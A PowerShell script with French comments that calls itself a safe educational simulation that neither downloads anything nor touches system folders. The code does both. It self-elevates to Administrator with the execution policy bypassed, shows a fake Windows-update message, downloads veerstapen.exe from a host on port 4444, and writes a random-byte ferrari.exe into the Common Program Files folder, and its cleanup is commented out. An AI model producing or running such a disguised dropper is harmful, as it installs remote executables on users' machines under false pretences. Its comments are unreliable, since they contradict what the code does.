# Script PowerShell sûr pour simulation éducative
# Ne télécharge rien depuis le réseau et ne touche pas aux dossiers système.

# Helpers
function Get-RandomString([int]$length = 8) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    -join ((1..$length) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
}

# --- Élévation : relance le script en mode Administrateur si nécessaire ---
# Doit être placé en début de script
function Test-IsAdmin {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $principal.IsInRole([System.Security.Principal.WindowsBuiltinRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    # chemin du script courant
    $scriptPath = $MyInvocation.MyCommand.Definition

    # reconstruire la liste d'arguments (si besoin)
    $escapedArgs = $args | ForEach-Object { '"{0}"' -f ($_ -replace '"','\"') } 
    $argString = if ($escapedArgs) { $escapedArgs -join ' ' } else { '' }

    $psArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $argString"

    try {
        Start-Process -FilePath (Get-Command pwsh -ErrorAction SilentlyContinue).Source -ArgumentList $psArgs -Verb RunAs -ErrorAction Stop
    }
    catch {
        # fallback to Windows PowerShell if pwsh not available
        Start-Process -FilePath "powershell.exe" -ArgumentList $psArgs -Verb RunAs
    }
    exit
}

$sourceUrl = "http://192.168.52.128:4444/veerstapen.exe"
$downloadFileName = "veerstapen.exe"     # nom local pour le fichier téléchargé
$baseTemp = $env:TEMP
$ferrariFolder = $Env:commonprogramfiles

$randomFolderName = Get-RandomString 8
$tempFolder = Join-Path $baseTemp $randomFolderName
New-Item -ItemType Directory -Path $tempFolder | Out-Null
Write-Host "Updating Windows... Please wait..."

$localDownloadPath = Join-Path $tempFolder $downloadFileName

Invoke-WebRequest -Uri $sourceUrl -OutFile $localDownloadPath -UseBasicParsing -ErrorAction Stop

# 4) Créer un fichier .zip avec un nom aléatoire de 6 caractères dans le même dossier
$zipName = "$(Get-RandomString 6).zip"
$zipPath = Join-Path -Path $tempFolder -ChildPath $zipName
# Utiliser Compress-Archive pour créer le zip. Si Compress-Archive existe sur la machine.
Compress-Archive -Path $localDownloadPath -DestinationPath $zipPath -Force

# 5) Attendre aléatoirement entre 1 et 3 secondes
$wait1 = Get-Random -Minimum 1 -Maximum 4  # Maximum is exclusive, so 4 => up to 3s
Start-Sleep -Seconds $wait1

# 6) Créer ferrari.exe dans un dossier sandbox sous Documents (NE PAS écrire dans des dossiers système)
if (-not (Test-Path -Path $ferrariFolder)) {
    New-Item -Path $ferrariFolder -ItemType Directory | Out-Null
}
$ferrariPath = Join-Path -Path $ferrariFolder -ChildPath "ferrari.exe"
$sizeInBytes = 83487  # Change this to the number of bytes you want

# Generate random bytes
$randomBytes = New-Object byte[] $sizeInBytes
[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomBytes)

# Convert bytes to UTF-8 string (may include invalid chars, optional replacement)
$utf8String = [System.Text.Encoding]::UTF8.GetString($randomBytes)

# Write to file
[System.IO.File]::WriteAllText($ferrariPath, $utf8String, [System.Text.Encoding]::UTF8)

# 7) Attendre aléatoirement entre 2 et 6 secondes
$wait2 = Get-Random -Minimum 2 -Maximum 7  # up to 6s
Start-Sleep -Seconds $wait2

<## Supprimer le ferrari.exe et le dossier sandbox si vide
if (Test-Path -Path $localDownloadPath) { Remove-Item -Path $localDownloadPath -Force }
if (Test-Path -Path $zipPath) { Remove-Item -Path $zipPath -Force }
try {
    # tenter de supprimer le dossier sandbox s'il est vide
    if ((Get-ChildItem -Path $tempFolder -Recurse -Force | Measure-Object).Count -eq 0) {
        Remove-Item -Path $tempFolder -Force
    }
} catch {}
#>
